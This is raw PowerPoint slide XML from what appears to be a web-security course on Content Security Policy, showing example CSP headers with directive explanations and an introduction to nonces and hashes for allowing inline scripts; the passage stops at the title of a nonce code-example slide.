          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Content-Security-Policy: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://cdn.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  object-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'none';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  base-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>uri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'none';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Meaning:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Only load JS from self</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Never load </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;objects&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Never allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;base&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> tags,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35453445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72C3-CC6F-B6BE-28AA-636577CD3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8052B-2A99-5321-3EF4-D2A1E20D68F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Basic Configuration example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38322779-5FBB-FF84-26A9-5D34917B961D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8315555" cy="4391667"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>03.  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>img-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, font-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, frame-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Content-Security-Policy: \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self'; \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>img-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://images.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>; \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  font-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://fonts.gstatic.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>; \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  connect-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> 'self' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://api.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>; \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>  frame-src https://www.youtube.com;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>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30697036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1985-86BD-07CC-2A6B-8ECD87826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DFAFC-C5C7-4160-0323-BBA16003BA0E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Nonces &amp; Hashes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E02E213E-DD0E-AB88-8981-5E83F1A65CF5}"/>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buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>strict</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> CSP wants to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>block all inline scripts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, but your app may need some small inline code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A bootstrapping loader,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A config object,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>An </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> snippet.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos" panose="020B0004020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos" panose="020B0004020202020204"/>
              </a:rPr>
              <a:t>This can be securely allowed using:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos" panose="020B0004020202020204"/>
              </a:rPr>
              <a:t>Nonces</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos" panose="020B0004020202020204"/>
              </a:rPr>
              <a:t>Hashes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10787877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D471-C649-9D31-956C-2646F8593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D5BF4-C937-30E7-927C-82E4B68BA853}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CSP Nonces</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17FF5A3E-C470-6C02-A25B-E457EE24AD76}"/>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buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A Nonce (Number used Only Once) can be dynamically injected into allowed &lt;script&gt; tags. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The server:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>generates a nonce,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>puts it in the CSP header,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>injects the same nonce into allowed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> tags.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The browser:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>checks that the nonce on a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> matches one of the nonces in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" err="1">
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="316065019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A812C-421F-8A87-13CD-DBE1A7BE9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8B3E1-3E6E-1CC1-FEE4-1D16AC22EE2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Code Example - CSP Nonces 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5A4F9E3-EFAD-6A53-0460-D0701F62428D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
